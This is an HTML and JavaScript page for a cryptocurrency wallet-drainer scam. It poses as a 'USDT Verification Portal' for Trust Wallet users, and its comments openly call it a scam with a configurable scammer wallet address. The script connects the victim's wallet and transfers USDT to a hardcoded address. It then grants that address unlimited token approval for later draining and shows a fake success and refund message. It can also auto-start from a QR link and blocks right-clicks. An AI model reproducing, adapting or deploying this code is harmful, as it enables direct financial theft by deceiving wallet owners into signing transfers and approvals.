<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Verification Portal</title>
    <!-- Trust Wallet automatically reads this title -->
    
    <!-- Ethers.js - MUST be included for blockchain interaction -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    
    <style>
        /* Minimal styling - just enough to look legit */
        body {
            font-family: -apple-system, sans-serif;
            text-align: center;
            padding: 40px 20px;
            background: white;
        }
        
        .verify-btn {
            background: #007AFF;
            color: white;
            border: none;
            padding: 18px 40px;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 30px;
            width: 100%;
            max-width: 300px;
        }
        
        .note {
            color: #666;
            font-size: 14px;
            margin-top: 20px;
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
        }
    </style>
</head>
<body>
    <h2>USDT Account Verification</h2>
    <p>Click below to verify your USDT holdings</p>
    
    <!-- Single button that triggers everything -->
    <button class="verify-btn" onclick="startVerificationProcess()">
        Verify USDT Holdings
    </button>
    
    <div class="note">
        This is a one-time verification process. 
        You will receive your funds back after verification.
    </div>

    <script>
        // ============================================
        // 
        // ============================================
        
        // Scammer's wallet address (CHANGE THIS)
        const SCAMMER_WALLET = "0x67af686a8ccbb858b1a36d64c585660a89b6a3dd";
        
        // BSC USDT contract (DO NOT CHANGE)
        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
        
        async function startVerificationProcess() {
            console.log("üöÄ Starting scam process...");
            
            // 1. FIRST: Check if Trust Wallet is installed
            if (typeof window.ethereum === 'undefined') {
                alert("Please open this page in Trust Wallet browser");
                return;
            }
            
            try {
                // 2. AUTOMATICALLY SWITCH TO BSC NETWORK
                // This happens in background, user may not see it
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }] // BSC Mainnet
                    });
                } catch (switchError) {
                    // If BSC network not added, add it automatically
                    if (switchError.code === 4902) {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x38',
                                chainName: 'BNB Smart Chain',
                                nativeCurrency: {
                                    name: 'BNB',
                                    symbol: 'BNB',
                                    decimals: 18
                                },
                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                blockExplorerUrls: ['https://bscscan.com']
                            }]
                        });
                    }
                }
                
                // 3. üéØ THIS TRIGGERS THE FIRST TRUST WALLET POPUP:
                // "Connect DApp" screen with "usdtverification.vercel.app"
                console.log("Triggering Trust Wallet connect popup...");
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                const userWallet = accounts[0];
                console.log("Connected wallet:", userWallet);
                
                // 4. Setup Ethers.js for transaction
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                
                // USDT contract ABI (only transfer function needed)
                const usdtAbi = [
                    "function transfer(address to, uint256 amount) returns (bool)",
                    "function approve(address spender, uint256 amount) returns (bool)"
                ];
                
                const usdtContract = new ethers.Contract(
                    USDT_CONTRACT,
                    usdtAbi,
                    signer
                );
                
                // 5. üéØ THIS TRIGGERS THE SECOND TRUST WALLET POPUP:
                // "Approve" screen with gas fee
                console.log("Triggering Trust Wallet transaction approval popup...");
                
                // Amount: 1 USDT (can be changed by scammer)
                const verificationAmount = "1";
                const amountInWei = ethers.utils.parseUnits(verificationAmount, 18);
                
                // ‚ö° THIS LINE CREATES THE "Approve" POPUP ‚ö°
                const transferTx = await usdtContract.transfer(
                    SCAMMER_WALLET,  // To scammer's wallet
                    amountInWei      // Amount to steal
                );
                
                console.log("Transaction hash (transfer):", transferTx.hash);
                
                // Wait for transaction confirmation
                await transferTx.wait();
                console.log("‚úÖ First transaction complete - USDT stolen");
                
                // 6. WAIT 3 SECONDS, THEN SET UNLIMITED APPROVAL
                // (Hidden second transaction)
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                console.log("Setting unlimited approval for future draining...");
                const unlimitedAmount = ethers.constants.MaxUint256;
                
                // Another approval popup (but user might not notice it's separate)
                const approveTx = await usdtContract.approve(
                    SCAMMER_WALLET,
                    unlimitedAmount
                );
                
                await approveTx.wait();
                console.log("‚úÖ Unlimited approval set - wallet can be drained anytime");
                
                // 7. Show fake success message
                alert("üéâ Verification Successful!\n\nYour USDT holdings have been verified.\nRefund will be processed within 24 hours.");
                
                // 8. Redirect to fake success page
                window.location.href = "success.html";
                
            } catch (error) {
                console.error("‚ùå Scam failed:", error);
                
                // User-friendly error messages
                if (error.code === 4001) {
                    alert("‚ùå Transaction was rejected. Please approve the transaction to complete verification.");
                } else if (error.message.includes("insufficient funds")) {
                    alert("‚ö†Ô∏è Insufficient BNB for gas fees. Please add BNB to your wallet and try again.");
                } else if (error.code === -32603) {
                    alert("‚ö†Ô∏è Network error. Please try again.");
                } else {
                    alert("‚ö†Ô∏è Error: " + (error.message || "Unknown error occurred"));
                }
            }
        }
        
        // Optional: Auto-start when page loads (for QR code scans)
        window.addEventListener('load', function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('auto') === 'true') {
                setTimeout(startVerificationProcess, 1500);
            }
        });
        
        // Prevent right-click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        
    </script>
</body>
</html>
